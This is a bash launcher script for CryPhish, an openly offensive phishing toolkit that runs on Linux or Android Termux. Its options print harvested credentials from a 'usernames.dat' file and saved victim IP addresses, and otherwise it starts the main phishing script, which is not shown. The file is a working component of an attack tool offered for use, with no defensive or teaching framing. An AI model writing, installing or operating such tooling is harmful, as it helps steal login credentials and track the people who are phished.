#!/bin/bash

# https://github.com/htr-tech/CryPhish

if [[ $(uname -o) == *'Android'* ]];then
	CryPhish_ROOT="/data/data/com.termux/files/usr/opt/CryPhish"
else
	export CryPhish_ROOT="/opt/CryPhish"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run CryPhish type \`CryPhish\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $CryPhish_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $CryPhish_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $CryPhish_ROOT
	bash ./CryPhish.sh
fi

